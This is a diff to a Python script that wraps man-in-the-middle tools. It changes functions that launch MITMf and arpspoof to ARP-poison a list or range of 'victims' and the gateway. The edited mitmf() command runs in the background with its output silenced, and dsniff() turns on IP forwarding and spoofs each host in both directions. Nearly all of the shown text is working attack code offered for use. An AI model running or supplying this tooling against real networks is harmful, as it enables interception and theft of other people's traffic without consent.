@@ -37,24 +37,16 @@ def bettercap():
 	os.system(cmd)
 	
 def mitmf():
-	""" This framework doesn't have a python3 version yet and have so many dependencies
-	that the authors opt to make it's instalation using virtual env. In order to make it
-	executable from os.system() you have to fill the mitmf_command like the following:
-	
-	mitmf_command = "/path/to/virtualenv/python2.7 /path/to/mitmf.py"
-	"""
-	mitmf_command = "/home/isac/.virtualenvs/MITMf/bin/python2.7 /home/isac/MITMf/mitmf.py"
+	""" This framework have bugs when you execute mitmf.py from outside it's directory. So make sure
+	you've copied the source, then cd to it. Also, it does not accept targets to be a range, like
+	`192.168.0.1-255`, but it does accept a comma separated list like `192.168.0.1,192.168.0.2`"""
 	targets = ""
 	for v in victims:
 		targets += v + ',' 
 	targets = targets.rstrip(',')
-	cmd = """ mkdir logs ;
-	{} -i eth0 \
-		--spoof \
-		--arp \
-		--target {}, \
-		--gateway {} \
-	""".format(mitmf_command,targets, GATEWAY_ADDRESS)
+	cmd = """
+	cd MITMf ; python2.7 mitmf.py -i eth0 --spoof --arp --target {} --gateway {} > /dev/null 2> /dev/null & 
+	""".format(targets, GATEWAY_ADDRESS)
 	print(cmd)
 	os.system(cmd)
 
@@ -63,10 +55,11 @@ def dsniff():
 	echo 1 > /proc/sys/net/ipv4/ip_forward ;
 	for x in $(seq {} $(({}-1)) ) ;
 	do
-		arpspoof -t {} 192.168.0.$x > /dev/null 2> /dev/null & 
-		arpspoof -t 192.168.0.$x {} > /dev/null 2> /dev/null & 
+		arpspoof -t {} 192.168.0.$x  > /dev/null 2> /dev/null &
+		arpspoof -t 192.168.0.$x {}  > /dev/null 2> /dev/null &
 	done
 	""".format(*IP_RANGE, GATEWAY_ADDRESS, GATEWAY_ADDRESS)
+	print(cmd)
 	os.system(cmd)
 
 def main():
